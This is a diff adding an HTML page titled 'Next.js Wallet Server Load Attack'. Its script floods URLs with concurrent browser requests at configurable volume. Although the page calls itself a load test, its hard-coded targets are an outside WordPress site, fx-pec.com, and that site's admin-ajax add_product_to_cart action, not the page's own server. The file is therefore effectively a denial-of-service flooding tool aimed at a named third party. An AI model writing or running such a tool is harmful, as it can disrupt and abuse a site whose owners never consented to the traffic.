@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Next.js Wallet Server Load </title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width:1000px;
+            margin: 0 auto;
+            padding: 20px;
+            background: #121313;
+            color: #fff;
+        }
+        .container {
+            margin-bottom: 20px;
+            padding: 15px;
+            background: #1a1a1a;
+            border: 1px solid #292929;
+            border-radius: 8px;
+        }
+        input, select, button {
+            padding: 8px 12px;
+            margin: 5px;
+            border: 1px solid #333;
+            border-radius: 4px;
+            background: #2a2a2a;
+            color: #fff;
+        }
+        button {
+            background: #3a3a3a;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #4a4a4a;
+        }
+        button:disabled {
+            background: #333;
+            color: #666;
+            cursor: not-allowed;
+        }
+        .stats {
+            margin-top: 20px;
+            padding: 15px;
+            background: #1a1a1a;
+            border: 1px solid #292929;
+            border-radius: 8px;
+        }
+        .request-log {
+            max-height: 300px;
+            overflow-y: auto;
+            background: #000;
+            padding: 10px;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 12px;
+        }
+        .success { color: #4CAF50; }
+        .error { color: #f44336; }
+        .warning { color: #ff9800; }
+    </style>
+</head>
+<body>
+    <h1>🔗 Next.js Wallet Server Load Attack</h1>
+    
+    <div class="container">
+        <h3>Test Configuration</h3>
+        
+        <div>
+            <label>Test Type:</label>
+            <select id="testType">
+                <option value="page">Page Load (GET /)</option>
+                <option value="static">Static Assets</option>
+                <option value="api">API Endpoints</option>
+                <option value="mixed">Mixed Load</option>
+            </select>
+        </div>
+
+        <div>
+            <label>Concurrent Users:</label>
+            <input type="number" id="concurrentUsers" value="5" min="1" max="50">
+        </div>
+
+        <div>
+            <label>Requests per User:</label>
+            <input type="number" id="requestsPerUser" value="20" min="1" max="1000">
+        </div>
+
+        <div>
+            <label>Delay between batches (ms):</label>
+            <input type="number" id="batchDelay" value="500" min="0" max="5000">
+        </div>
+
+        <br>
+        <button onclick="startAdvancedLoadTest()">🚀 Start Advanced Load Test</button>
+        <button onclick="stopLoadTest()" style="background: #d32f2f;">🛑 Stop Test</button>
+        <button onclick="clearLogs()">🗑️ Clear Logs</button>
+    </div>
+
+    <div class="stats">
+        <h3>📊 Test Results</h3>
+        <div id="summary">
+            <div>Status: <span id="status">Ready</span></div>
+            <div>Total Requests: <span id="totalRequests">0</span></div>
+            <div>Successful: <span id="successfulRequests" class="success">0</span></div>
+            <div>Failed: <span id="failedRequests" class="error">0</span></div>
+            <div>Average Response Time: <span id="avgResponseTime">0ms</span></div>
+        </div>
+        
+        <h4>📝 Request Log</h4>
+        <div class="request-log" id="requestLog"></div>
+    </div>
+
+    <script>
+        let isTesting = false;
+        let testController = null;
+        let totalRequests = 0;
+        let successfulRequests = 0;
+        let failedRequests = 0;
+        let responseTimes = [];
+
+        // Updated assets and scripts
+const staticAssets = [
+   "https://fx-pec.com/wp-admin/admin-ajax.php?action=add_product_to_cart",
+    "https://fx-pec.com"
+  
+    
+        ];
+
+        function logMessage(message, type = 'info') {
+            const log = document.getElementById('requestLog');
+            const timestamp = new Date().toLocaleTimeString();
+            const logEntry = document.createElement('div');
+            logEntry.className = type;
+            logEntry.textContent = `[${timestamp}] ${message}`;
+            log.appendChild(logEntry);
+            log.scrollTop = log.scrollHeight;
+        }
+
+        async function makeRequest(url, options = {}) {
+            const startTime = performance.now();
+            
+            try {
+                const controller = new AbortController();
+                const signal = controller.signal;
+                
+                if (testController) {
+                    testController.signal.addEventListener('abort', () => {
+                        controller.abort();
+                    });
+                }
+
+                const response = await fetch(url, {
+                    method: 'GET',
+                    headers: {
+                        'Content-Type': 'text/html',
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                        ...options.headers
+                    },
+                    signal,
+                    ...options
+                });
+
+                const endTime = performance.now();
+                const duration = Math.round(endTime - startTime);
+                
+                totalRequests++;
+                
+                if (response.ok) {
+                    successfulRequests++;
+                    responseTimes.push(duration);
+                    logMessage(`✓ ${url} - ${response.status} (${duration}ms)`, 'success');
+                    return { success: true, status: response.status, duration, url };
+                } else {
+                    failedRequests++;
+                    logMessage(`✗ ${url} - ${response.status} (${duration}ms)`, 'error');
+                    return { success: false, status: response.status, duration, url };
+                }
+            } catch (error) {
+                const endTime = performance.now();
+                const duration = Math.round(endTime - startTime);
+                
+                totalRequests++;
+                failedRequests++;
+                
+                if (error.name === 'AbortError') {
+                    logMessage(`⏹️ ${url} - Request aborted`, 'warning');
+                } else {
+                    logMessage(`✗ ${url} - ${error.message} (${duration}ms)`, 'error');
+                }
+                
+                return { success: false, error: error.message, duration, url };
+            }
+        }
+
+        async function simulateUser(userId, requests, testType) {
+            for (let i = 0; i < requests && isTesting; i++) {
+                let url = '/';
+                
+                // Choose request type based on test configuration
+                if (testType === 'static' || (testType === 'mixed' && Math.random() > 0.5)) {
+                    const randomAsset = staticAssets[Math.floor(Math.random() * staticAssets.length)];
+                    url = randomAsset;
+                }
+                
+                await makeRequest(url);
+                
+                // Add some variability between user requests
+                const randomDelay = Math.random() * 1000;
+                await new Promise(resolve => setTimeout(resolve, randomDelay));
+            }
+        }
+
+        async function startAdvancedLoadTest() {
+            if (isTesting) return;
+            
+            isTesting = true;
+            testController = new AbortController();
+            totalRequests = 0;
+            successfulRequests = 0;
+            failedRequests = 0;
+            responseTimes = [];
+            
+            const testType = document.getElementById('testType').value;
+            const concurrentUsers = parseInt(document.getElementById('concurrentUsers').value);
+            const requestsPerUser = parseInt(document.getElementById('requestsPerUser').value);
+            const batchDelay = parseInt(document.getElementById('batchDelay').value);
+            
+            document.getElementById('status').textContent = 'Testing...';
+            logMessage(`Starting load test: ${concurrentUsers} users, ${requestsPerUser} requests each, ${testType} mode`, 'info');
+            
+            try {
+                const userPromises = [];
+                
+                for (let i = 0; i < concurrentUsers; i++) {
+                    // Stagger user start times
+                    await new Promise(resolve => setTimeout(resolve, batchDelay));
+                    
+                    if (!isTesting) break;
+                    
+                    userPromises.push(simulateUser(i, requestsPerUser, testType));
+                }
+                
+                await Promise.all(userPromises);
+                
+                if (isTesting) {
+                    document.getElementById('status').textContent = 'Completed';
+                    logMessage('Load test completed successfully!', 'success');
+                }
+            } catch (error) {
+                logMessage(`Test error: ${error.message}`, 'error');
+            } finally {
+                updateStats();
+            }
+        }
+
+        function stopLoadTest() {
+            isTesting = false;
+            if (testController) {
+                testController.abort();
+            }
+            document.getElementById('status').textContent = 'Stopped';
+            logMessage('Load test stopped by user', 'warning');
+            updateStats();
+        }
+
+        function clearLogs() {
+            document.getElementById('requestLog').innerHTML = '';
+        }
+
+        function updateStats() {
+            document.getElementById('totalRequests').textContent = totalRequests;
+            document.getElementById('successfulRequests').textContent = successfulRequests;
+            document.getElementById('failedRequests').textContent = failedRequests;
+            
+            const avgTime = responseTimes.length > 0 
+                ? Math.round(responseTimes.reduce((a, b) => a + b, 0) / responseTimes.length)
+                : 0;
+            document.getElementById('avgResponseTime').textContent = `${avgTime}ms`;
+        }
+
+        // Update stats every second during testing
+        setInterval(() => {
+            if (isTesting) {
+                updateStats();
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
